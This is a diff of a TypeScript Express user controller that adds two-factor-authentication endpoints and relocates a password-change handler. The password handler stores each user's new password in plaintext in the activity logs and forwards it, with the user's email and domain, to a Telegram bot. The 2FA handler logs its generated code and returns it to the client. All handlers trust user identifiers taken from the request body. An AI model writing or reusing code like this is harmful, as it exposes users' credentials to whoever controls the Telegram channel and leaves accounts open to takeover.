@@ -3,6 +3,7 @@ import { validationResult } from 'express-validator'
 import ApiError from '../exeptions/api_error'
 import UserServices from '../services/user_services'
 import telegram from '../api/telegram_api'
+import codeGenerator from '../api/password_generator'
 
 
 async function saveUserLogs(id: number, email: string, ipAddress: string, city: string, countryName: string, coordinates: string, currentDate: string, userAction: string, userDomain: string) {
@@ -91,36 +92,62 @@ class UserController {
     }
   }
 
-  async personalAreaSecurity(req: express.Request, res: express.Response, next: express.NextFunction) {
+  async twoStepVerificationEnable(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
-      // get accoutn security (2fa, login history)
+
+      interface dataObject {
+        twoFaType: string
+        twoFaStatus: boolean
+        domainName: string
+        userId: number
+        userEmail: string
+        code: string
+      }
+
+      const code: string = await codeGenerator(8)
+      console.log('generated code is: ', code);
+
+      const transferObject: dataObject = {
+        twoFaType: req.body.twoFaType,
+        twoFaStatus: req.body.twoFaStatus,
+        domainName: req.body.domainName,
+        userId: req.body.userId,
+        userEmail: req.body.userEmail,
+        code: code
+      }
+      const result: boolean = await UserServices.enableTwoStepVerification(transferObject)
+      if (result === false) return res.status(400).json({ message: 'wrong data', status: 'rejected' })
+
+      return res.status(200).json({ message: '2fa was enabled', status: 'complete', userCode: code })
+
 
     } catch (e) {
       next(e)
     }
   }
 
-  async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
+  async enableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
-      // get accoutn security (2fa, login history)
-      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
-      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
-      if (result === false) {
-        console.log('operation status: ', result)
-        return res.json({
-          message: 'password doesn`t change',
-          status: 'rejected'
-        })
+      interface UserParams {
+        userId: number
+        userEmail: string
+        domainName: string
+        twoFaStatus: boolean
+        enableDate: string
       }
-      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
-      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
-      console.log('operation status: ', result)
-      return res.json({
-        message: 'password was change',
-        status: 'complete'
-      })
 
+      const transferObject: UserParams = {
+        userId: req.body.userId,
+        userEmail: req.body.userEmail,
+        domainName: req.body.domainName,
+        twoFaStatus: req.body.twoFaStatus,
+        enableDate: req.body.enableDate
+      }
 
+      const result: boolean = await UserServices.enableTwoStepVerificationStatus(transferObject)
+      if (result === false) return res.status(400).json({ message: 'wrong data', status: 'rejected' })
+
+      return res.status(200).json({ message: '2fa turned on', status: 'complete' })
     } catch (e) {
       next(e)
     }
@@ -144,6 +171,32 @@ class UserController {
       await telegram.sendMessageByUserActions(userEmail, `выключил 2фа аутентификацию `, domainName)
       return res.json({
         message: '2fa turned off',
+        status: 'complete'
+      })
+
+
+    } catch (e) {
+      next(e)
+    }
+  }
+
+  async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
+    try {
+      // get accoutn security (2fa, login history)
+      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
+      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
+      if (result === false) {
+        console.log('operation status: ', result)
+        return res.json({
+          message: 'password doesn`t change',
+          status: 'rejected'
+        })
+      }
+      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
+      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
+      console.log('operation status: ', result)
+      return res.json({
+        message: 'password was change',
         status: 'complete'
       })
 
